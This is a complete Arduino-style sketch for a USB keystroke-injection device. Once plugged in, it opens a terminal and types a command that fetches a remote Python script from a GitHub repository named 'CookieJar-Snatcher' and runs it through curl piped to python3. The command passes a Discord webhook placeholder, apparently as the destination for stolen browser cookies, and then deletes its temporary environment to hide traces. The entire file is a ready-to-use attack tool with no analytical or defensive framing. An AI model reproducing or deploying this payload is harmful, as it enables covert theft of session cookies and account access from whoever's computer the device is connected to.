#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  USB.begin();

  Keyboard.write(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(2000);

  Keyboard.print("terminal");
  delay(750);
  Keyboard.write(KEY_RETURN);
  delay(3000);

  Keyboard.print("python3 -m venv .env && source .env/bin/activate && pip install requests pyserial && curl -sSL https://raw.githubusercontent.com/StraightDopamine/CookieJar-Snatcher/refs/heads/main/xenon.py | python3 - 'YOUR_DISCORD_WEBHOOK_URL_HERE' && deactivate && rm -rf .env\n");  
  delay(1000);
}


void loop() {
  // put your main code here, to run repeatedly:
}
